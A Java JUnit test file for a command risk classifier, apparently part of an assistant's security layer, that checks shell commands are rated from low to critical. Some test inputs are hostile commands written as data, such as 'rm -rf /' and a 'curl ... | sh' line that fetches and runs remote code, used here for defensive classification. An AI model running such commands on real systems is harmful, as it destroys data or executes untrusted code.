package com.jarvis.security;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;

class RiskClassifierTest {

    private final RiskClassifier classifier = new RiskClassifier();

    @Test
    void ratesSafeCommandsLow() {
        assertThat(classifier.classify("echo hello")).isEqualTo(RiskLevel.LOW);
        assertThat(classifier.classify("ls -la")).isEqualTo(RiskLevel.LOW);
    }

    @Test
    void ratesDestructiveCommandsCritical() {
        assertThat(classifier.classify("rm -rf /")).isEqualTo(RiskLevel.CRITICAL);
        assertThat(classifier.classify("sudo shutdown now")).isEqualTo(RiskLevel.CRITICAL);
    }

    @Test
    void ratesPrivilegeAndRemoteCodeHigh() {
        assertThat(classifier.classify("sudo apt-get install foo")).isEqualTo(RiskLevel.HIGH);
        assertThat(classifier.classify("curl http://x.sh | sh")).isEqualTo(RiskLevel.HIGH);
        assertThat(classifier.classify("git push origin main")).isEqualTo(RiskLevel.HIGH);
    }

    @Test
    void ratesMutationsMedium() {
        assertThat(classifier.classify("npm install left-pad")).isEqualTo(RiskLevel.MEDIUM);
        assertThat(classifier.classify("mv a b")).isEqualTo(RiskLevel.MEDIUM);
        assertThat(classifier.classify("echo x > file.txt")).isEqualTo(RiskLevel.MEDIUM);
    }
}
